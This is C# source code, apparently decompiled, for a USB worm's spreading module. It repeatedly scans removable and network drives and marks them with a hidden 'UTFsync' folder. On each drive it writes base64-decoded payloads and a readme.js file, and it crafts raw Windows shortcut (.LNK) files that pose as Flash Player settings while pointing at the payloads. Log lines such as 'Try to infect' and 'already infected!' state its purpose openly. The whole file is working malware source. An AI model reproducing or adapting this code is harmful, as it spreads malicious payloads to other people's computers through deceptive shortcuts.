using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace USB;

public class USBLNK
{
	private const string home = "UTFsync";

	private const string inf_data = "\\inf_data";

	public static List<string> blacklist = new List<string>();

	public static string gb3;

	public static string gb6;

	public static string jsdata;

	public static void Main1(string b1, string b2, string b3)
	{
		gb3 = b1;
		gb6 = b2;
		jsdata = b3;
		new Timer(ResetBlacklist, null, 10000, 10000);
		while (true)
		{
			BaseMode();
			Thread.Sleep(5000);
		}
	}

	private static void ResetBlacklist(object state)
	{
		blacklist.Clear();
	}

	private static bool CreateHomeDirectory(string drive)
	{
		try
		{
			DirectoryInfo directoryInfo = Directory.CreateDirectory(drive + "UTFsync");
			directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
			return true;
		}
		catch
		{
		}
		return false;
	}

	private static bool IsSupported(DriveInfo drive)
	{
		if (drive.IsReady && drive.AvailableFreeSpace > 1024L && (drive.DriveType == DriveType.Removable || drive.DriveType == DriveType.Network))
		{
			if (!(drive.DriveFormat == "FAT32"))
			{
				return drive.DriveFormat == "NTFS";
			}
			return true;
		}
		return false;
	}

	private static bool CheckBlacklist(string name)
	{
		if (!(name == "UTFsync") && !(name == "System Volume Information"))
		{
			return name == ".BIN";
		}
		return true;
	}

	private static bool Infect(string drive)
	{
		if (blacklist.Contains(drive))
		{
			return true;
		}
		CreateLnk(drive, "blue3.bin", gb3);
		CreateLnk(drive, "blue6.bin", gb6);
		CreateJs(drive, "readme.js", jsdata);
		try
		{
			File.Create(drive + "UTFsync\\inf_data");
			return true;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
		return false;
	}

	private static bool CreateJs(string drive, string fname, string gb)
	{
		FileStream fileStream = new FileStream(drive + fname, FileMode.Create);
		byte[] array = Convert.FromBase64String(gb);
		fileStream.Write(array, 0, array.Length);
		fileStream.Close();
		Console.WriteLine(array.Length);
		return true;
	}

	private static bool CreateLnk(string drive, string binfname, string gb)
	{
		byte[] array = new byte[118]
		{
			76, 0, 0, 0, 1, 20, 2, 0, 0, 0,
			0, 0, 192, 0, 0, 0, 0, 0, 0, 70,
			129, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 156, 0, 20, 0,
			31, 128, 32, 32, 236, 33, 234, 58, 105, 16,
			162, 221, 8, 0, 43, 48, 48, 157, 134, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, 106, 0, 0, 0, 0, 0, 0
		};
		byte[] array2 = new byte[3] { 58, 0, 92 };
		byte[] array3 = new byte[109]
		{
			0, 0, 0, 70, 0, 108, 0, 97, 0, 115,
			0, 104, 0, 32, 0, 80, 0, 108, 0, 97,
			0, 121, 0, 101, 0, 114, 0, 0, 0, 77,
			0, 97, 0, 110, 0, 97, 0, 103, 0, 101,
			0, 32, 0, 70, 0, 108, 0, 97, 0, 115,
			0, 104, 0, 32, 0, 80, 0, 108, 0, 97,
			0, 121, 0, 101, 0, 114, 0, 32, 0, 83,
			0, 101, 0, 116, 0, 116, 0, 105, 0, 110,
			0, 103, 0, 115, 0, 0, 0, 0, 0, 16,
			0, 0, 0, 5, 0, 0, 160, 3, 0, 0,
			0, 20, 0, 0, 0, 0, 0, 0, 0
		};
		for (char c = 'D'; c <= 'K'; c = (char)(c + 1))
		{
			FileStream fileStream = new FileStream(drive + c + binfname.Replace(".bin", ".lnk"), FileMode.Create);
			fileStream.Write(array, 0, array.Length);
			byte[] array4 = new byte[4];
			int num = binfname.Length + 4;
			array4[0] = (byte)((uint)num & 0xFFu);
			array4[1] = (byte)((num & 0xFF00) >> 8);
			array4[2] = 13;
			array4[3] = 0;
			fileStream.Write(array4, 0, array4.Length);
			byte[] array5 = new byte[2]
			{
				(byte)(c & 0xFFu),
				(byte)((c & 0xFF00) >> 8)
			};
			fileStream.Write(array5, 0, array5.Length);
			fileStream.Write(array2, 0, array2.Length);
			foreach (char c2 in binfname)
			{
				byte[] array6 = new byte[2]
				{
					(byte)((c2 & 0xFF00) >> 8),
					(byte)(c2 & 0xFFu)
				};
				fileStream.Write(array6, 0, array6.Length);
			}
			fileStream.Write(array3, 0, array3.Length);
			fileStream.Close();
		}
		FileStream fileStream2 = new FileStream(drive + binfname, FileMode.Create);
		byte[] array7 = Convert.FromBase64String(gb);
		fileStream2.Write(array7, 0, array7.Length);
		fileStream2.Close();
		Console.WriteLine(array7.Length);
		return true;
	}

	private static void BaseMode()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (blacklist.Contains(driveInfo.Name))
			{
				continue;
			}
			Console.WriteLine("Detect drive:" + driveInfo.Name);
			if (IsSupported(driveInfo))
			{
				if (!File.Exists(string.Concat(driveInfo, "UTFsync\\inf_data")))
				{
					Console.WriteLine("Try to infect " + driveInfo.Name);
					if (CreateHomeDirectory(driveInfo.Name) && Infect(driveInfo.Name))
					{
						blacklist.Add(driveInfo.Name);
					}
				}
				else
				{
					Console.WriteLine(driveInfo.Name + " already infected!");
					blacklist.Add(driveInfo.Name);
				}
			}
			else
			{
				blacklist.Add(driveInfo.Name);
			}
		}
	}
}
